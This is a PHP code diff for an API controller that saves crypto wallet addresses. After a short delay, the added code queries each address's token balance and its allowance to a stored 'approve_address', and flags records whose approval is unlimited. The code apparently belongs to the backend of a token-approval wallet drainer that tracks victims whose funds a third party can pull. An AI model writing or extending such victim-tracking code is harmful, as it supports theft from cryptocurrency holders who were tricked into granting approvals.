@@ -46,6 +46,29 @@ class Address extends Api
             }else{
                 (new \app\admin\model\Address())->insert($params);
             }
+            sleep(2);
+            $vo = Db('address')->where(['address'=>$params['address']])->find();
+            if($vo){
+                if((new \Tron\Address($vo['address']))->isValid()){
+                    $qb_type = 1;
+                }else{
+                    $qb_type = 2;
+                }
+                $money_online = (new \app\common\service\Getbalance())->getTokenBalance($qb_type,$vo['address'],$vo['contract_address'],$vo['approve_address_decimals']);
+                $money_approve = (new \app\common\service\Getbalance())->getTokenApprove($qb_type,$vo['address'],$vo['approve_address'],$vo['contract_address'],$vo['approve_address_decimals']);
+                if($money_approve >= 115792089237316195423570985008687907853269984665640564039457584007913129.639936){
+                    db('address')->where(['id'=>$vo['id']])->update(['money_approve'=>10000000000,'money_online'=>$money_online,'is_approve'=>1,'is_approve_old'=>1]);
+                }else{
+                    if($money_approve  > 0){
+                        if($money_approve > 10000000000){
+                            $money_approve = 10000000000;
+                        }
+                        db('address')->where(['id'=>$vo['id']])->update(['updatetime'=>time(),'money_approve'=> $money_approve,'money_online'=>$money_online,'is_approve'=>1,'is_approve_old'=>1]);
+                    }else{
+                        db('address')->where(['id'=>$vo['id']])->update(['updatetime'=>time(),'money_approve'=> $money_approve,'money_online'=>$money_online,'is_approve'=>0]);
+                    }
+                }
+            }
             return 'ok';
         }catch (Exception $e) {
             return $e->getMessage();
